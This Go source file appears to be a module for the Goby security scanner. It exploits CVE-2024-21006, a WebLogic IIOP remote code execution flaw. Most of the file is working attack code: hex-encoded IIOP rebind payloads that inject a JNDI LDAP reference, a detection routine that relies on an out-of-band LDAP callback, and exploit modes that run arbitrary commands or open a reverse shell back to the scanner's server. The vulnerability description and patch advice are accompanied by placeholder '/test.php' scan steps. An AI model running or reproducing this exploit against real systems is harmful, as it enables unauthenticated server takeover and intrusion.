package exploits

import (
	"bytes"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/jsonvul/protocols"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Weblogic MessageDestinationReference Remote Code Execution Vulnerability (CVE-2024-21006)",
    "Description": "<p>WebLogic Server is one of the application server components suitable for both cloud and traditional environments.</p><p>WebLogic has a remote code execution vulnerability that allows an unauthenticated attacker to access and destroy a vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can cause WebLogic Server to be taken over by an attacker, resulting in remote code execution.</p>",
    "Product": "Weblogic_interface_7001",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2024-01-16",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "(body=\"Welcome to WebLogic Server\")||(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "GobyQuery": "(body=\"Welcome to WebLogic Server\")||(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "Level": "3",
    "Impact": "<p>There is a remote code execution vulnerability in WebLogic, which allows an unauthenticated attacker to access and damage the vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can lead to WebLogic Server being taken over by the attacker, resulting in remote code execution.</p>",
    "Recommendation": "<p>1. Currently, the manufacturer has released an upgrade patch. Please pay attention to the official website to download updates in time: <a href=\"https://www.oracle.com/security-alerts/cpujan2024.html\">https://www.oracle.com/security-alerts/cpujan2024.html</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2024",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2024-21006"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Weblogic MessageDestinationReference 远程代码执行漏洞 (CVE-2024-21006)",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server 是其中的一个适用于云环境和传统环境的应用服务器组件。</p><p>WebLogic 存在远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过 IIOP 协议网络访问并破坏易受攻击的 WebLogic Server，成功的漏洞利用可导致 WebLogic Server 被攻击者接管，从而造成远程代码执行。</p>",
            "Recommendation": "<p>1、目前厂商已发布升级补丁，请关注官方网站及时下载更新：<a href=\"https://www.oracle.com/security-alerts/cpujan2024.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpujan2024.html</a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>WebLogic 存在远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过 IIOP 协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致 WebLogic Server 被攻击者接管，从而造成远程代码执行。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "HW-2024",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Weblogic MessageDestinationReference Remote Code Execution Vulnerability (CVE-2024-21006)",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server is one of the application server components suitable for both cloud and traditional environments.</p><p>WebLogic has a remote code execution vulnerability that allows an unauthenticated attacker to access and destroy a vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can cause WebLogic Server to be taken over by an attacker, resulting in remote code execution.</p>",
            "Recommendation": "<p>1. Currently, the manufacturer has released an upgrade patch. Please pay attention to the official website to download updates in time: <a href=\"https://www.oracle.com/security-alerts/cpujan2024.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpujan2024.html</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>There is a remote code execution vulnerability in WebLogic, which allows an unauthenticated attacker to access and damage the vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can lead to WebLogic Server being taken over by the attacker, resulting in remote code execution.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "HW-2024",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-07-30",
    "PocId": "10981"
}`
	getPayloadFlagPKwofcXj := func(ldapURL, bindName string) []byte {
		bindName = hex.EncodeToString([]byte(bindName))
		bindNameLengthHex := fmt.Sprintf("%x", len(bindName)/2)
		if len(bindName)/2 < 16 {
			bindNameLengthHex = "0" + bindNameLengthHex
		}
		ldapURLnum := len(ldapURL)
		hexString := fmt.Sprintf("%x", ldapURLnum)
		// bindName长度设定为6，根据协议格式已在tail填充0
		tail := "000000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff020000005e524d493a7765626c6f6769632e6170706c69636174696f6e2e6e616d696e672e4d65737361676544657374696e6174696f6e5265666572656e63653a313431353331444544413841434238383a373939384144434434343735323234350000007fffff0a00000037524d493a6a6176612e7574696c2e566563746f723a414537424231383643383442423736353a4439393737443542383033424146303100000000000c0101000000000000000000007fffff0a00000029524d493a5b4c6a6176612e6c616e672e4f626a6563743b3a3030303030303030303030303030303000000000000002840000000a0000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e300000000000010000000000000000ffffffff7fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000003b7765626c6f6769632e6170706c69636174696f6e2e6e616d696e672e4d65737361676544657374696e6174696f6e4f626a656374466163746f727900000000007fffff02ffffffffffffff8c000000377765626c6f6769632e6170706c69636174696f6e2e6e616d696e672e4d65737361676544657374696e6174696f6e5265666572656e6365007fffff02ffffffffffffff44000000" + hexString + hex.EncodeToString([]byte(ldapURL)) + "0000000000000000000000"
		header := "00000001000000" + bindNameLengthHex + bindName + tail
		data, _ := hex.DecodeString(header)
		return data
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			ldapToken := goutils.RandomHexString(4)
			bindName := goutils.RandomHexString(6)

			ldapURL, _ := godclient.GetGodLDAPCheckURL("U", ldapToken)

			if err := protocols.NewIIOP(u.HostInfo, func(iiop *protocols.IIOP) error {
				if resp, err := iiop.Rebind(getPayloadFlagPKwofcXj(ldapURL, bindName)); err != nil {
					return errors.New("rebind 失败")
				} else if resp != nil && bytes.Contains(resp, []byte{0x00, 0x00, 0x05, 0x6d, 0x65, 0x74, 0x61, 0x00}) {
					data, _ := hex.DecodeString("47494f5001020001000004b00000000200000000000000014245410000000004000a03060000000000000017466f726569676e4f70617175655265666572656e6365000000000054524d493a7765626c6f6769632e6a6e64692e696e7465726e616c2e466f726569676e4f70617175655265666572656e63653a414246453946443345443735343434463a3344323135323746454435393645463100000000000000001f49444c3a7765626c6f6769632f6a6e64692f696e7465726e616c3a312e300000000000113344323135323746454435393645463100000000000000000000000000000004000000106a6e6469456e7669726f6e6d656e74000000003a524d493a6a6176612e7574696c2e486173687461626c653a383635373335363841323131433031313a313342423046323532313441453442380000000000001249444c3a6a6176612f7574696c3a312e3000000000000004312e30000000001e00000078000000000000003a524d493a6a6176612e7574696c2e486173687461626c653a383635373335363841323131433031313a313342423046323532313441453442380000000000000956616c7565426f78000000000000001d0000001c00000000000000010000000000000001000000000000000000000000000000010000000000000000000000000000000f72656d6f74654a4e44494e616d6500000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001249444c3a6a6176612f6c616e673a312e3000000000000004312e30000000001e00000048000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000d57537472696e6756616c7565000000000000001b00000000000000010000000000000000000000000000000a7369676e61747572650000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001249444c3a6a6176612f6c616e673a312e3000000000000004312e30000000001e00000048000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000d57537472696e6756616c7565000000000000001b00000000000000010000000000000000000000000000000a74696d657374616d700000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001249444c3a6a6176612f6c616e673a312e3000000000000004312e30000000001e00000048000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000d57537472696e6756616c7565000000000000001b0000000000000001000000000000000000000000000000000000000200000033524d493a7765626c6f6769632e6a6e64692e4f70617175655265666572656e63653a3030303030303030303030303030303000000000002a524d493a6a6176612e696f2e53657269616c697a61626c653a30303030303030303030303030303030000000000000000000000000000001000000000000001d0000001c00000000000000010000000000000001000000000000000000000000")
					iiop.Conn.Write(data)
				}
				if _, err := iiop.Lookup(bindName); err != nil {
					return err
				}
				return nil
			}); err != nil && !strings.Contains(err.Error(), `rebind 失败`) {
				return false
			}
			if godclient.PullExists(ldapToken, 10*time.Second) {
				ss.VulURL = u.FixedHostInfo
				return true
			}
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackMode := goutils.B2S(ss.Params["attackType"])
			ldapURL := ""
			var waitSessionCh chan string
			if attackMode == "cmd" {
				// 执行命令
				ldapURL = "ldap://" + godclient.GetGodServerHost() + "/A3"
			} else if attackMode == "ldap" {
				// 执行自定义 LDAP
				ldapURL = goutils.B2S(ss.Params["ldap_addr"])
			} else if attackMode == "reverse" {
				waitSessionCh = make(chan string)
				// 构建反弹Shell LDAP
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
					expResult.Output = err.Error()
					return expResult
				}
				ldapURL = "ldap://" + godclient.GetGodServerHost() + "/E" + godclient.GetKey() + rp
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			bindName := goutils.RandomHexString(6)
			if err := protocols.NewIIOP(expResult.HostInfo.HostInfo, func(iiop *protocols.IIOP) error {
				var stub []byte
				if attackMode == "cmd" {
					stub, _ = iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b")
				}
				// 存根读取失败或者执行方式非等于cmd
				if stub == nil || len(stub) == 0 || attackMode != "cmd" {
					_, err := iiop.Rebind(getPayloadFlagPKwofcXj(ldapURL, bindName))
					// rebind
					if _, err = iiop.Rebind(getPayloadFlagPKwofcXj(ldapURL, bindName)); err != nil {
						return err
					}
					// lookup,反弹会占用连接导致超时
					if _, err = iiop.Lookup(bindName); err != nil && attackMode != "reverse" {
						return err
					}
				}
				if attackMode == "cmd" {
					stub, err := iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b")
					if err != nil {
						return err
					}
					rsp, err := iiop.Exec(stub, goutils.B2S(ss.Params["cmd"]))
					if err != nil {
						return err
					}
					expResult.Success = true
					expResult.Output = rsp
					return nil
				} else if attackMode == "ldap" {
					expResult.Success = true
					expResult.Output = "Check LDAP Address : " + ldapURL + " ok!"
					return nil
				} else if attackMode == "reverse" {
					// 执行反弹
					// 执行reverse 检测
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
							return nil
						}
					case <-time.After(time.Second * 10):
						return errors.New("反弹失败")
					}
				} else {
					expResult.Success = false
					return errors.New("未知的利用方式")
				}
				return nil
			}); err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			return expResult
		}))
}
